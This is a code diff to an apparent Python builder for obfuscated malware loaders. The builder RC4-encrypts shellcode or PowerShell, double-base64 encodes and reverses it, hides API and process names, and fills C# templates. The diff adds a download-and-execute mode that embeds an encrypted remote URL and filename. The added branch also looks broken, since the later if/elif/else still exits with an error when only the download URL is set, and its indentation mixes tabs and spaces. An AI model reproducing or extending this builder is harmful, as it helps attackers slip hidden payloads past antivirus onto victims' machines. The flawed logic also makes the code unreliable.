@@ -165,14 +165,19 @@ if __name__ == "__main__":
     pattern2 = Helper.gen_pattern(",.<>)(*[]{}")
 
     cipher = ""
+    filename = ""
     template_path = "template/Program.cs"
+    if not config.get("download-url") == "":
+	template_path = "template/Program-downloadexec.cs"
+	cipher = Helper.replace_data(base64.b64encode(base64.b64encode(rc4.Encrypt(Helper.load_file(config.get("download-url"), True), key))[::-1]), pattern1, "N", pattern2, "B")
+    	filename = Helper.replace_data(base64.b64encode(base64.b64encode(rc4.Encrypt(Helper.load_file(config.get("filename"), True), key))[::-1]), pattern1, "N", pattern2, "B")
     if not config.get("shellcode") == "":
         cipher = Helper.replace_data(base64.b64encode(base64.b64encode(rc4.Encrypt(Helper.load_file(config.get("shellcode"), True), key))[::-1]), pattern1, "N", pattern2, "B")
     elif not config.get("powershell") == "":
 	template_path = "template/Program-ps.cs"
         cipher = Helper.replace_data(base64.b64encode(base64.b64encode(rc4.Encrypt(Helper.load_file(config.get("powershell"), True), key))[::-1]), pattern1, "N", pattern2, "B")
     else:
-	Helper.print_error("Missing config variable (shellcode or powershell)")
+	Helper.print_error("Missing config variable (shellcode, powershell or download-url)")
 	exit(0)
     
     if args.report:
@@ -184,7 +189,8 @@ if __name__ == "__main__":
     .replace("[PROCESS_NAME]", Helper.replace_data(base64.b64encode(rc4.Encrypt(config.get("process_name"), key)), pattern1, "N", pattern2, "B")) \
     .replace("[CREATE_THREAD]", Helper.replace_data(base64.b64encode(rc4.Encrypt("CreateThread", key)), pattern1, "N", pattern2, "B")) \
     .replace("[PATTERN_1]", pattern1) \
-    .replace("[PATTERN_2]", pattern2)
+    .replace("[PATTERN_2]", pattern2) \
+    .replace("[FILENAME]", filename)
     
     if args.report:
         template = template.replace("[URL_REPORT]", Helper.replace_data(base64.b64encode(rc4.Encrypt(config.get("url_report"), key)), pattern1, "N", pattern2, "B"))
